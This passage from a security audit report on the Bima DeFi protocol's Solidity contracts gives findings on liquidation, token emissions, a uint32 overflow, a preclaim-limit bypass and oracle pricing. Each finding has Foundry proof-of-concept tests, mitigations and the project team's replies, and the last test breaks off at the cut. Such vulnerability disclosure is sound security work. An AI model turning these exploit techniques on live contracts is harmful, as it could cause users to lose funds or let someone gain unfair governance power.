        // `while` and `for` loops get bypassed when there is
        // only 1 active borrower!
        vm.expectRevert("LiquidationManager: nothing to liquidate");
        liquidationMgr.liquidate(stakedBTCTroveMgr, users.user1);

        // attempting to use the other liquidation function has same problem
        uint256 mcr = stakedBTCTroveMgr.MCR();
        vm.expectRevert("LiquidationManager: nothing to liquidate");
        liquidationMgr.liquidateTroves(stakedBTCTroveMgr, 1, mcr);

        // the borrower is impossible to liquidate
    }
}
```

Run with `forge test --match-test test_impossibleToLiquidateSingleBorrower`.

**Recommended Mitigation:** Simply changing `troveCount >= 1` results in a panic divide by zero inside `TroveManager::_redistributeDebtAndColl`. A possible solution is to add the following in that function:
```diff
        uint256 totalStakesCached = totalStakes;

+       // if there is only 1 trove open and that is being liquidated, prevent
+       // a panic during liquidation due to divide by zero
+       if(totalStakesCached == 0) {
+           totalStakesCached = 1;
+       }

        // Get the per-unit-staked terms
```

With this change it appears safe to enable `troveCount >= 1` everywhere but inside `LiquidationManager::liquidateTroves` there is some code that [looks for other troves](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L196-L205) which may cause problems if executing when only 1 Trove exists.

Note: in the existing code there is this [comment](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/TroveManager.sol#L1083-L1086) which indicates that "liquidating the final trove" is blocked to allow a `TroveManager` being sunset to be closed. But the current implementation prevents liquidation of any single trove at any time.

The suggested fix may prevent a sunsetting `TroveManager` from being closed if the last trove is liquidated since this would result in a state where `defaultedDebt > 0` and hence `TroveManager::getEntireSystemDebt` would return > 0 which causes this [check](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/BorrowerOperations.sol#L124) to return false.

**Bima:**
We will handle this by having or own trove on each `TroveManager` with minimal debt and highest CR. This will ensure everyone is liquidatable and also during sunsetting we can just close our own trove which will be the final one.


### Permanent loss of `BabelToken` if a disabled emissions receiver doesn't call `Vault::allocateNewEmissions`

**Description:** `BabelToken` is permanently lost if a disabled emissions receiver doesn't call `Vault::allocateNewEmissions` as:
* `Vault::_allocateTotalWeekly` allocates `BabelToken` according to total weekly votes which contain votes for disabled receivers
* if a disabled receiver doesn't call `Vault::allocateNewEmissions`, the already allocated tokens for the receiver won't be used to increase `BabelVault::unallocatedTotal` - they will simply be "lost"
* `Vault::allocateNewEmissions` can only be called by the receiver and a disabled receiver doesn't have any incentive to call this function
* The loss of tokens increases with the amount of disabled receivers

**Impact:** Permanent loss of `BabelToken` after disabling emissions receivers.

**Proof of Concept:** Add the PoC function to test/foundry/dao/VaultTest.t.sol:
```solidity
function test_allocateNewEmissions_tokensLostAfterDisablingReceiver() public {
    // setup vault giving user1 half supply to lock for voting power
    uint256 initialUnallocated = _vaultSetupAndLockTokens(INIT_BAB_TKN_TOTAL_SUPPLY/2);

    // receiver to be disabled later
    address receiver1 = address(mockEmissionReceiver);
    uint256 RECEIVER_ID1 = _vaultRegisterReceiver(receiver1, 1);

    // ongoing receiver
    MockEmissionReceiver mockEmissionReceiver2 = new MockEmissionReceiver();
    address receiver2 = address(mockEmissionReceiver2);
    uint256 RECEIVER_ID2 = _vaultRegisterReceiver(receiver2, 1);

    // user votes for receiver1 to get emissions with 50% of their points
    IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](1);
    votes[0].id = RECEIVER_ID1;
    votes[0].points = incentiveVoting.MAX_POINTS() / 2;
    vm.prank(users.user1);
    incentiveVoting.registerAccountWeightAndVote(users.user1, 52, votes);

    // user votes for receiver2 to get emissions with 50% of their points
    votes[0].id = RECEIVER_ID2;
    vm.prank(users.user1);
    incentiveVoting.vote(users.user1, votes, false);

    // disable emission receiver 1 prior to calling allocateNewEmissions
    vm.prank(users.owner);
    babelVault.setReceiverIsActive(RECEIVER_ID1, false);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // cache current system week
    uint16 systemWeek = SafeCast.toUint16(babelVault.getWeek());

    // initial unallocated supply has not changed
    assertEq(babelVault.unallocatedTotal(), initialUnallocated);

    // receiver calls allocateNewEmissions
    vm.prank(receiver2);
    uint256 allocatedToEachReceiver = babelVault.allocateNewEmissions(RECEIVER_ID2);

    // verify BabelVault::totalUpdateWeek is current system week
    assertEq(babelVault.totalUpdateWeek(), systemWeek);

    // verify receiver1 and receiver2 have the same allocated amounts
    uint256 firstWeekEmissions = initialUnallocated*INIT_ES_WEEKLY_PCT/BIMA_100_PCT;
    assertTrue(firstWeekEmissions > 0);
    assertEq(babelVault.unallocatedTotal(), initialUnallocated - firstWeekEmissions);
    assertEq(firstWeekEmissions, allocatedToEachReceiver * 2);

    // if receiver1 doesn't call allocateNewEmissions the tokens they would
    // have received would never be allocated. Only if receiver1 calls allocateNewEmissions
    // do the tokens move into BabelVault::unallocatedTotal
    //
    // verify unallocated is increasing if receiver1 calls allocateNewEmissions
    vm.prank(receiver1);
    babelVault.allocateNewEmissions(RECEIVER_ID1);
    assertEq(babelVault.unallocatedTotal(), initialUnallocated - firstWeekEmissions + allocatedToEachReceiver);

    // since receiver1 was disabled they have no incentive to call allocateNewEmissions
    // allocateNewEmissions only allows the receiver to call it so admin is
    // unable to rescue those tokens
}
```

Run with: `forge test --match-test test_allocateNewEmissions_tokensLostAfterDisablingReceiver`

**Recommended Mitigation:** Anyone should be able to call `Vault::allocateNewEmissions` for disabled receivers to recover the allocated funds. And voting shouldn't be allowed for disabled receivers to prevent users from voting for disabled receivers to "steal" emissions from enabled receivers they don't like.

**Bima:**
Fixed in commits [42e2ed5](https://github.com/Bima-Labs/bima-v1-core/commit/42e2ed52feda653d56ee0282b93fdabdd7d68350) & [5a7f862](https://github.com/Bima-Labs/bima-v1-core/commit/5a7f862279db6f8834477997ae701b8bb57323ed).

**Cyfrin:** Verified.

\clearpage
## Medium Risk


### Loss of user locked voting tokens due to unsafe downcast overflow

**Description:** `TokenLocker::AccountData` [stores](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L41-L49) the account's current `locked`, `unlocked` and `frozen` balances using `uint32`:
```solidity
struct AccountData {
    // Currently locked balance. Each week the lock weight decays by this amount.
    uint32 locked;
    // Currently unlocked balance (from expired locks, can be withdrawn)
    uint32 unlocked;
    // Currently "frozen" balance. A frozen balance is equivalent to a `MAX_LOCK_WEEKS` lock,
    // where the lock weight does not decay weekly. An account may have a locked balance or a
    // frozen balance, never both at the same time.
    uint32 frozen;
```

Inside `TokenLocker::_lock` the input `uint256 _amount` token value which the user is locking gets unsafely [downcast](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L450) into `uint32`:
```solidity
accountData.locked = uint32(accountData.locked + _amount);
```

Then in `TokenLocker::_weeklyWeightWrite`, `accountData.locked` is [read](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L914) into a `uint256` in the calculation to update the `unlocked` amount but this is useless as the downcast has already occurred:
```solidity
uint256 locked = accountData.locked;
```

Finally in `TokenLocker::withdrawExpiredLocks` this will either [revert](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L765-L780) with "No unlocked tokens" if the overflow resulted in 0, or will transfer back to the user far less tokens than they initially locked up:
```solidity
function withdrawExpiredLocks(uint256 _weeks) external returns (bool) {
    _weeklyWeightWrite(msg.sender);
    getTotalWeightWrite();

    AccountData storage accountData = accountLockData[msg.sender];
    uint256 unlocked = accountData.unlocked;
    require(unlocked > 0, "No unlocked tokens");
    accountData.unlocked = 0;
    if (_weeks > 0) {
        _lock(msg.sender, unlocked, _weeks);
    } else {
        lockToken.transfer(msg.sender, unlocked * lockToTokenRatio);
        emit LocksWithdrawn(msg.sender, unlocked, 0);
    }
    return true;
}
```

**Impact:** Loss of user locked voting tokens due to unsafe downcast overflow.

**Proof of Concept:** For a simple example, in `test/foundry/TestSetup.sol` set `INIT_BAB_TKN_TOTAL_SUPPLY` to something greater than `type(uint32).max` and set `INIT_LOCK_TO_TOKEN_RATIO = 1` eg:
```solidity
uint256 internal constant INIT_LOCK_TO_TOKEN_RATIO = 1;
uint256 internal constant INIT_BAB_TKN_TOTAL_SUPPLY = 1_000_000e18;
```

Add following test contract to `test/foundry/dao/TokenLockerTest.t.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// test setup
import {TestSetup, IBabelVault} from "../TestSetup.sol";

contract TokenLockerTest is TestSetup {

    function setUp() public virtual override {
        super.setUp();

        // setup the vault to get BabelTokens which are used for voting
        uint128[] memory _fixedInitialAmounts;
        IBabelVault.InitialAllowance[] memory initialAllowances
            = new IBabelVault.InitialAllowance[](1);

        // give user1 allowance over the entire supply of voting tokens
        initialAllowances[0].receiver = users.user1;
        initialAllowances[0].amount = INIT_BAB_TKN_TOTAL_SUPPLY;

        vm.prank(users.owner);
        babelVault.setInitialParameters(emissionSchedule,
                                        boostCalc,
                                        INIT_BAB_TKN_TOTAL_SUPPLY,
                                        INIT_VLT_LOCK_WEEKS,
                                        _fixedInitialAmounts,
                                        initialAllowances);

        // transfer voting tokens to recipients
        vm.prank(users.user1);
        babelToken.transferFrom(address(babelVault), users.user1, INIT_BAB_TKN_TOTAL_SUPPLY);

        // verify recipients have received voting tokens
        assertEq(babelToken.balanceOf(users.user1), INIT_BAB_TKN_TOTAL_SUPPLY);
    }

    function test_withdrawExpiredLocks_LossOfLockedTokens() external {
        // save user initial balance
        uint256 userInitialBalance = babelToken.balanceOf(users.user1);
        assertEq(userInitialBalance, INIT_BAB_TKN_TOTAL_SUPPLY);

        // assert overflow will occur
        assertTrue(userInitialBalance > uint256(type(uint32).max)+1);

        // first lock up entire user balance for 1 week
        vm.prank(users.user1);
        tokenLocker.lock(users.user1, userInitialBalance, 1);

        // advance time by 2 week
        vm.warp(block.timestamp + 2 weeks);
        uint256 weekNum = 2;
        assertEq(tokenLocker.getWeek(), weekNum);

        // withdraw without re-locking to get all locked tokens back
        vm.prank(users.user1);
        tokenLocker.withdrawExpiredLocks(0);

        // verify user received all their tokens back
        assertEq(babelToken.balanceOf(users.user1), userInitialBalance);

        // fails with 2701131776 != 1000000000000000000000000
        // user locked   1000000000000000000000000
        // user unlocked 2701131776
        // critical loss of funds
    }
}
```

Run with: `forge test --match-test test_withdrawExpiredLocks_LossOfLockedTokens -vvv`

**Recommended Mitigation:** Limit the total supply of the voting token to be `<= type(uint32).max * lockToTokenRatio` and use OpenZeppelin's `SafeCast` [library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeCast.sol) instead of performing unsafe downcasts.

The supply limit should be placed inside `BabelVault::setInitialParameters` like this:
```solidity
// enforce invariant described in TokenLocker to prevent overflows
require(totalSupply <= type(uint32).max * locker.lockToTokenRatio(),
        "Total supply must be <= type(uint32).max * lockToTokenRatio");
```

This is actually noted in this [comment](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L24-L30) but never enforced anywhere.

**Bima:**
Fixed in commits [9b69cbc](https://github.com/Bima-Labs/bima-v1-core/commit/9b69cbccde9a7a04e4565010b70d0fc5ba0849be#diff-cb0cf104b2cecec4497370ac4e4c839cecf6fc744430a058acc8465914b9e5ebR103-R106) and [7a52f26](https://github.com/Bima-Labs/bima-v1-core/commit/7a52f266420ea4cd4c6b4c87b5f600bfc7dc54ad).

**Cyfrin:** Verified.


### Maximum preclaim limit can be easily bypassed to preclaim entire token allocation

**Description:** The `AllocationVesting` contract allows token recipients to preclaim up to a maximum of their total token allocation, however this limit can easily by passed allowing recipients to preclaim their entire allocations.

**Impact:** Token allocation recipients can preclaim their entire allocations. Since preclaim performs a max-length lock via `TokenLocker`, this can be abused to quickly gain far greater voting power in the DAO than would otherwise be possible.

**Proof of Concept:** Add the PoC function to `test/foundry/dao/AllocationInvestingTest.t.sol`:
```solidity
function test_transferPoints_BypassVestingViaPreclaim() external {
    AllocationVesting.AllocationSplit[] memory allocationSplits
        = new AllocationVesting.AllocationSplit[](2);

    uint24 INIT_POINTS = 50000;

    // allocate to 2 users 50% 50%
    allocationSplits[0].recipient = users.user1;
    allocationSplits[0].points = INIT_POINTS;
    allocationSplits[0].numberOfWeeks = 4;

    allocationSplits[1].recipient = users.user2;
    allocationSplits[1].points = INIT_POINTS;
    allocationSplits[1].numberOfWeeks = 4;

    // setup allocations
    uint256 vestingStart = block.timestamp + 1 weeks;
    allocationVesting.setAllocations(allocationSplits, vestingStart);

    // warp to start time
    vm.warp(vestingStart + 1);

    // each entity receiving allocations is entitled to 10% preclaim
    // which they can use to get voting power by locking it up in TokenLocker
    uint256 MAX_PRECLAIM = (maxTotalPreclaimPct * totalAllocation) / (2 * 100);

    // user1 does this once, passing 0 to preclaim max possible
    vm.prank(users.user1);
    allocationVesting.lockFutureClaimsWithReceiver(users.user1, users.user1, 0);

    // user1 has now preclaimed the max allowed
    (, , , uint96 preclaimed) = allocationVesting.allocations(users.user1);
    assertEq(preclaimed, MAX_PRECLAIM);

    // user1 attempts it again
    vm.prank(users.user1);
    allocationVesting.lockFutureClaimsWithReceiver(users.user1, users.user1, 0);

    // but nothing additional is preclaimed
    (, , , preclaimed) = allocationVesting.allocations(users.user1);
    assertEq(preclaimed, MAX_PRECLAIM);

    // user 1 needs to wait 3 days to bypass LockedAllocation revert
    vm.warp(block.timestamp + 3 days);

    // user1 calls `transferPoints` to move their points to a new address
    address user1Second = address(0x1337);
    vm.prank(users.user1);
    allocationVesting.transferPoints(users.user1, user1Second, INIT_POINTS);

    // since `transferPoints` doesn't transfer preclaimed amounts, the
    // new address has its preclaimed amount as 0
    (, , , preclaimed) = allocationVesting.allocations(user1Second);
    assertEq(preclaimed, 0);

    // user1 now uses their secondary address to preclaim a second time!
    vm.prank(user1Second);
    allocationVesting.lockFutureClaimsWithReceiver(user1Second, user1Second, 0);

    // user1 was able to claim 2x the max preclaim
    (, , , preclaimed) = allocationVesting.allocations(user1Second);
    assertEq(preclaimed, MAX_PRECLAIM);

    // user1 can continue this strategy to preclaim their entire
    // token allocation which would give them significantly greater
    // voting power in the DAO, since each preclaim performs a max
    // length lock via TokenLocker to give voting weight
}
```

Comment out the token transfers inside `AllocationVesting::_claim` and `lockFutureClaimsWithReceiver` since the setup is very basic.

Run with: `forge test --match-test test_transferPoints_BypassVestingViaPreclaim`

**Recommended Mitigation:** In `AllocationVesting::transferPoints` perform the following storage update *before* all the other storage updates:
```solidity
// update storage - if from has a positive preclaimed balance,
// transfer preclaimed amount in proportion to points tranferred
// to prevent point transfers being used to bypass the maximum preclaim limit
if(fromAllocation.preclaimed > 0) {
    uint96 preclaimedToTransfer = SafeCast.toUint96((uint256(fromAllocation.preclaimed) * points) /
                                                    fromAllocation.points);

    // this should never happen but sneaky users may try preclaiming and
    // point transferring using very small amounts so prevent this
    if(preclaimedToTransfer == 0) revert PositivePreclaimButZeroTransfer();

    allocations[to].preclaimed = toAllocation.preclaimed + preclaimedToTransfer;
    allocations[from].preclaimed = fromAllocation.preclaimed - preclaimedToTransfer;
}
```

**Bima:**
Fixed in commits [8bcbf1b](https://github.com/Bima-Labs/bima-v1-core/commit/8bcbf1b7133eb61d07a6aa1e038e8b43d06d188a), [239fe50](https://github.com/Bima-Labs/bima-v1-core/commit/239fe5064232cd19d0607d3ffc07773b43598689) & [0bfbd9a](https://github.com/Bima-Labs/bima-v1-core/commit/0bfbd9aac20f73ddb7fa990ff852d867884cd7f4).

**Cyfrin:** Verified.


### When `BabelVault` uses an `EmissionSchedule` but receivers have no voting weight, the vault's unallocated supply will decrease even though no tokens are being allocated

**Description:** When `BabelVault` uses an `EmissionSchedule` but receivers have no voting weight, the vault's unallocated supply will decrease even though no tokens are being allocated.

**Impact:** Tokens are effectively lost since the vault's unallocated supply decreases but no tokens are actually allocated to receivers.

**Proof of Concept:** Add the following PoC to `test/foundry/dao/VaultTest.t.sol`:
```solidity
function test_allocateNewEmissions_unallocatedTokensDecreasedButZeroAllocated() external {
    // first need to fund vault with tokens
    test_setInitialParameters();

    // owner registers receiver
    address receiver = address(mockEmissionReceiver);
    vm.prank(users.owner);
    assertTrue(babelVault.registerReceiver(receiver, 1));

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // cache state prior to allocateNewEmissions
    uint256 RECEIVER_ID = 1;
    uint16 systemWeek = SafeCast.toUint16(babelVault.getWeek());

    // entire supply still not allocated
    uint256 initialUnallocated = babelVault.unallocatedTotal();
    assertEq(initialUnallocated, INIT_BAB_TKN_TOTAL_SUPPLY);

    // receiver calls allocateNewEmissions
    vm.prank(receiver);
    uint256 allocated = babelVault.allocateNewEmissions(RECEIVER_ID);

    // verify BabelVault::totalUpdateWeek current system week
    assertEq(babelVault.totalUpdateWeek(), systemWeek);

    // verify unallocated supply reduced by weekly emission percent
    uint256 firstWeekEmissions = INIT_BAB_TKN_TOTAL_SUPPLY*INIT_ES_WEEKLY_PCT/MAX_PCT;
    assertTrue(firstWeekEmissions > 0);
    assertEq(babelVault.unallocatedTotal(), initialUnallocated - firstWeekEmissions);

    // verify emissions correctly set for current week
    assertEq(babelVault.weeklyEmissions(systemWeek), firstWeekEmissions);

    // verify BabelVault::lockWeeks reduced correctly
    assertEq(babelVault.lockWeeks(), INIT_ES_LOCK_WEEKS-INIT_ES_LOCK_DECAY_WEEKS);

    // verify receiver active and last processed week = system week
    (, bool isActive, uint16 updatedWeek) = babelVault.idToReceiver(RECEIVER_ID);
    assertEq(isActive, true);
    assertEq(updatedWeek, systemWeek);

    // however even though BabelVault::unallocatedTotal was reduced by the
    // first week emissions, nothing was allocated to the receiver
    assertEq(allocated, 0);

    // this is because EmissionSchedule::getReceiverWeeklyEmissions calls
    // IncentiveVoting::getReceiverVotePct which looks back 1 week, and receiver
    // had no voting weight and there was no total voting weight at all in that week
    assertEq(incentiveVoting.getTotalWeightAt(systemWeek-1), 0);
    assertEq(incentiveVoting.getReceiverWeightAt(RECEIVER_ID, systemWeek-1), 0);

    // tokens were effectively lost since the vault's unallocated supply decreased
    // but no tokens were actually allocated to receivers since there was no
    // voting weight
}
```

Run with: `orge test --match-test test_allocateNewEmissions_unallocatedTokensDecreasedButZeroAllocated`

**Recommended Mitigation:** If planning to use an `EmissionSchedule` with `BabelVault`, the safest mitigation is to ensure that at least one user always has:
* locked their tokens with `TokenLocker`
* registered their voting weight with `IncentiveVoting`
* voted for at least 1 emissions receiver

Another option is to changing the code of `EmissionSchedule::getTotalWeeklyEmissions` to:
1) call `IncentiveVoting::getTotalWeightWrite`
2) call `IncentiveVoting::getTotalWeightAt(week-1)` to get the total weight for the previous week
3) if total weight for previous week was 0, `EmissionSchedule::getTotalWeeklyEmissions` could return 0 and not modify any storage such as `lockWeeks`.

The risk is that this code change may have unintended consequences in other parts of the system.

**Bima:**
We will use the first mitigation ensuring that at least one user has locked their tokens, registered their voting weights and voted for at least 1 emission receiver.


### Disabled receiver can lose tokens that were allocated for past weeks if not regularly claiming emissions

**Description:** When a receiver is disabled by `Vault::setReceiverIsActive`, they can lose tokens which they were eligible to receive in past weeks if they have not been regularly claiming emissions.

**Impact:** A disabled receiver can lose tokens which they were eligible for.

**Proof of Concept:** A receiver can be disabled using `Vault::setReceiverIsActive`.

```solidity
function setReceiverIsActive(uint256 id, bool isActive) external onlyOwner returns (bool success) {
    // revert if receiver id not associated with an address
    require(idToReceiver[id].account != address(0), "ID not set");

    // update storage - isActive status, address remains the same
    idToReceiver[id].isActive = isActive;

    emit ReceiverIsActiveStatusModified(id, isActive);

    success = true;
}
```

When a receiver claims allocated tokens using `Vault::allocateNewEmissions`, the allocated tokens for the past weeks will be added to the receiver if they are active but refunded to the unallocated supply if they have been disabled.

```solidity
if (receiver.isActive) {
    allocated[msg.sender] += amount;

    emit IncreasedAllocation(msg.sender, amount);
}
// otherwise return allocation to the unallocated supply
else {
    uint256 unallocated = unallocatedTotal + amount;
    unallocatedTotal = SafeCast.toUint128(unallocated);
    ...
}
```

So a receiver can lose tokens if they are disabled without claiming the allocated tokens for past weeks, even though they were eligible to receive those tokens during those past weeks.

Similarly if a receiver is disabled then later enabled, when the receiver calls `Vault::allocateNewEmissions` they'll receive tokens for the past weeks they were disabled.

**Recommended Mitigation:** If this is not the intended behavior, `Vault::setReceiverIsActive` should claim already allocated tokens before disabling a receiver. Similarly when enabling a previously disabled receiver that receiver's updated week should be set to the current system week to prevent tokens being claimed for past weeks when the receiver was disabled.

**Bima:**
Acknowledged.


### `IncentiveVoting::unfreeze` doesn't remove votes if a user has voted with unfrozen weight prior to freezing

**Description:** `IncentiveVoting::unfreeze` doesn't remove votes if a user has voted with unfrozen weight prior to freezing.

**Impact:** Users keep their past votes unexpectedly after unfreezing their locks with `keepIncentivesVote = false`.

**Proof of Concept:** Add the PoC function to `test/foundry/dao/VaultTest.t.sol`:
```solidity
function test_unfreeze_failToRemoveActiveVotes() external {
    // setup vault giving user1 half supply to lock for voting power
    _vaultSetupAndLockTokens(INIT_BAB_TKN_TOTAL_SUPPLY/2);

    // verify user1 has 1 unfrozen lock
    (ITokenLocker.LockData[] memory activeLockData, uint256 frozenAmount)
        = tokenLocker.getAccountActiveLocks(users.user1, 0);
    assertEq(activeLockData.length, 1); // 1 active lock
    assertEq(frozenAmount, 0); // 0 frozen amount
    assertEq(activeLockData[0].amount, 2147483647);
    assertEq(activeLockData[0].weeksToUnlock, 52);

    // register receiver
    uint256 RECEIVER_ID = _vaultRegisterReceiver(address(mockEmissionReceiver), 1);

    // user1 votes for receiver
    IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](1);
    votes[0].id = RECEIVER_ID;
    votes[0].points = incentiveVoting.MAX_POINTS();

    vm.prank(users.user1);
    incentiveVoting.registerAccountWeightAndVote(users.user1, 52, votes);

    // verify user1 has 1 active vote
    votes = incentiveVoting.getAccountCurrentVotes(users.user1);
    assertEq(votes.length, 1);
    assertEq(votes[0].id, RECEIVER_ID);
    assertEq(votes[0].points, 10_000);

    // user1 freezes their lock
    vm.prank(users.user1);
    tokenLocker.freeze();

    // verify user1 has 1 frozen lock
    (activeLockData, frozenAmount) = tokenLocker.getAccountActiveLocks(users.user1, 0);
    assertEq(activeLockData.length, 0); // 0 active lock
    assertGt(frozenAmount, 0); // positive frozen amount

    // user1 unfreezes without keeping their past votes
    vm.prank(users.user1);
    tokenLocker.unfreeze(false); // keepIncentivesVote = false

    // BUT user1 still has 1 active vote which is not an intended design
    votes = incentiveVoting.getAccountCurrentVotes(users.user1);
    assertEq(votes.length, 1);
    assertEq(votes[0].id, RECEIVER_ID);
    assertEq(votes[0].points, 10_000);
}
```

Run with: `forge test --match-test test_unfreeze_failToRemoveActiveVotes`

**Recommended Mitigation:** `unfreeze` should remove votes even if `frozenWeight` is zero:
```diff
    function unfreeze(address account, bool keepVote) external returns (bool success) {
        // only tokenLocker can call this function
        require(msg.sender == address(tokenLocker));

        // get storage reference to account's lock data
        AccountData storage accountData = accountLockData[account];

        // cache account's frozen weight
        uint256 frozenWeight = accountData.frozenWeight;

-        // if frozenWeight == 0, the account was not registered so nothing needed
        if (frozenWeight > 0) {
            // same as before
        }
+       else if (!keepVote) {
+            // clear previous votes
+            if (accountData.voteLength > 0) {
+                _removeVoteWeights(account, getAccountCurrentVotes(account), 0);
+
+                accountData.voteLength = 0;
+                accountData.points = 0;
+
+                emit ClearedVotes(account, week);
+            }
+        }

        success = true;
    }
```

**Bima:**
Fixed in commit [51a1a94](https://github.com/Bima-Labs/bima-v1-core/commit/51a1a94f06cfab526d2c467f02d71d3e490d470d).

**Cyfrin:** Verified.


### `StorkOracleWrapper` downscales 18 decimal price to 8 decimals then `PriceFeed` upscales to 18 decimals resulting in inaccurate price

**Description:** `StorkOracleWrapper` returns hard-coded 8 decimals:
```solidity
function decimals() external pure returns (uint8 dec) {
    dec = 8;
}
```

And its functions `getRoundData` and `latestRoundData` always downscale the native 18-decimal price to 8 decimals:
```solidity
answer = int256(quantizedValue / 1e10);
```

But `PriceFeed` always converts Oracle values to 18 decimals:
```solidity
uint256 public constant TARGET_DIGITS = 18;

function _scalePriceByDigits(uint256 _price, uint256 _answerDigits) internal pure returns (uint256 scaledPrice) {
    if (_answerDigits == TARGET_DIGITS) {
        scaledPrice = _price;
    } else if (_answerDigits < TARGET_DIGITS) {
        // Scale the returned price value up to target precision
        scaledPrice = _price * (10 ** (TARGET_DIGITS - _answerDigits));
    } else {
        // Scale the returned price value down to target precision
        scaledPrice = _price / (10 ** (_answerDigits - TARGET_DIGITS));
    }
}
```

**Impact:** Asset prices used by the protocol will always lose 10 decimals of accuracy.

**Recommended Mitigation:** `StorkOracleWrapper` should not downscale the price to 8 decimals; it should return the native 18 decimal value.

**Bima:**
Fixed in commit [d952ac6](https://github.com/Bima-Labs/bima-v1-core/commit/d952ac66cbbdfc7bf752af3a26bed3679cbd15ad).

**Cyfrin:** Verified.


### No checks for L2 Sequencer being down

**Description:** Neither `PriceFeed.sol` (which is designed to work with Chainlink) nor `StorkOracleWrapper` (which has been created to allow `PriceFeed` to work with Stork Oracles) implement a check to test whether the L2 Sequencer is currently down.

When using Chainlink or other oracles with L2 chains like Arbitrum, smart contracts should [check whether the L2 Sequencer is down](https://medium.com/Bima-Labs/chainlink-oracle-defi-attacks-93b6cb6541bf#0faf) to avoid stale pricing data that appears fresh.

**Impact:** Code can execute with prices that dont reflect the current pricing resulting in a potential loss of funds for users or the protocol.

**Recommended Mitigation:** Chainlinks official documentation provides an [example](https://docs.chain.link/data-feeds/l2-sequencer-feeds#example-code) implementation of checking L2 sequencers. Stork's publicly available documentation does not provide any such feed.

**Bima:**
Acknowledged; Stork Oracle does not have an API for the L2 Sequencer status check at this time.


### `PriceFeed` will use incorrect price when underlying aggregator reaches `minAnswer`

**Description:** `PriceFeed` which has been designed to work with Chainlink oracles will use incorrect price when underlying aggregator reaches `minAnswer`.

This occurs because Chainlink price feeds have in-built minimum & maximum prices they will return; if due to an unexpected event an assets value falls below the price feeds minimum price, [the oracle price feed will continue to report the (now incorrect) minimum price](https://medium.com/Bima-Labs/chainlink-oracle-defi-attacks-93b6cb6541bf#00ac).

**Impact:** Code can execute with prices that dont reflect the current pricing resulting in a potential loss of funds for users/protocol.

**Recommended Mitigation:** Revert unless `minAnswer < answer < maxAnswer`. Additionally Stork Oracle (which may be used with `PriceFeed` via `StorkOracleWrapper`) has no publicly available documentation on its own behavior in this situation so we advise contacting them to ask about this.

**Bima:**
We will be using `PriceFeed` purely with Stork Oracle not Chainlink, and Stork Oracle does not have min/max values.


### Some `TroveManager` debt emission rewards can be lost

**Description:** `TroveManager` can earn token emission rewards from `BabelVault` if users vote for it to do so, and these rewards are distributed to users based either on debts or mints.

When creating a unit test scenario with all emissions going to `TroveManager` debt id, not all emissions appear to be distributed to users with open troves.

**Impact:** Not all the weekly token emissions allocated to  `TroveManager` get distributed to users with open troves; some amounts are never distributed and effectively lost.

**Proof of Concept:** Add the PoC to `test/foundry/core/BorrowerOperationsTest.t.sol`:
```solidity
function test_claimReward_someTroveManagerDebtRewardsLost() external {
    // setup vault giving user1 half supply to lock for voting power
    uint256 initialUnallocated = _vaultSetupAndLockTokens(INIT_BAB_TKN_TOTAL_SUPPLY/2);

    // owner registers TroveManager for vault emission rewards
    vm.prank(users.owner);
    babelVault.registerReceiver(address(stakedBTCTroveMgr), 2);

    // user votes for TroveManager debtId to get emissions
    (uint16 TM_RECEIVER_DEBT_ID, /*uint16 TM_RECEIVER_MINT_ID*/) = stakedBTCTroveMgr.emissionId();

    IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](1);
    votes[0].id = TM_RECEIVER_DEBT_ID;
    votes[0].points = incentiveVoting.MAX_POINTS();

    vm.prank(users.user1);
    incentiveVoting.registerAccountWeightAndVote(users.user1, 52, votes);

    // user1 and user2 open a trove with 1 BTC collateral for their max borrowing power
    uint256 collateralAmount = 1e18;
    uint256 debtAmountMax
        = ((collateralAmount * _getScaledOraclePrice() / borrowerOps.CCR())
          - INIT_GAS_COMPENSATION);

    _openTrove(users.user1, collateralAmount, debtAmountMax);
    _openTrove(users.user2, collateralAmount, debtAmountMax);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // calculate expected first week emissions
    uint256 firstWeekEmissions = initialUnallocated*INIT_ES_WEEKLY_PCT/BIMA_100_PCT;
    assertEq(firstWeekEmissions, 536870911875000000000000000);
    assertEq(babelVault.unallocatedTotal(), initialUnallocated);

    uint16 systemWeek = SafeCast.toUint16(babelVault.getWeek());

    // no rewards in the same week as emissions
    assertEq(stakedBTCTroveMgr.claimableReward(users.user1), 0);
    assertEq(stakedBTCTroveMgr.claimableReward(users.user2), 0);

    vm.prank(users.user1);
    uint256 userReward = stakedBTCTroveMgr.claimReward(users.user1);
    assertEq(userReward, 0);
    vm.prank(users.user2);
    userReward = stakedBTCTroveMgr.claimReward(users.user2);
    assertEq(userReward, 0);

    // verify emissions correctly set in BabelVault for first week
    assertEq(babelVault.weeklyEmissions(systemWeek), firstWeekEmissions);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // rewards for the first week can be claimed now
    // users receive less?
    assertEq(firstWeekEmissions/2, 268435455937500000000000000);
    uint256 actualUserReward =     263490076563008042796633412;

    assertEq(stakedBTCTroveMgr.claimableReward(users.user1), actualUserReward);
    assertEq(stakedBTCTroveMgr.claimableReward(users.user2), actualUserReward);

